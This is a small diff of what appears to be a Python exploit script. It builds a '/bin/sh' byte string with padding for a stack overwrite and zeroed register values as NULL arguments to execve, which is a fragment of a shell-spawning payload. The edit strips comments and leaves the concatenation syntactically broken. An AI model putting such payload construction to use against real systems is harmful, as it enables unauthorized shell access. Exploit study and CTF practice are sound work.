@@ -5,8 +5,8 @@ import sys
 
 #bin sh in hex, need value to overwrite to stack etc.:
 bin_sh = (
-    b'\x00\x00' +                    # 2 bytes padding
-    b'/bin/sh\x00' +                 # 8 bytes
+    b'\x00\x00' +                   
+    b'/bin/sh\x00'                 
 )
 #null arguments are in RDI and RSI registers with value 0, this is for NULL arguments of excev
 null_rdi = (0).to_bytes(8, 'little')
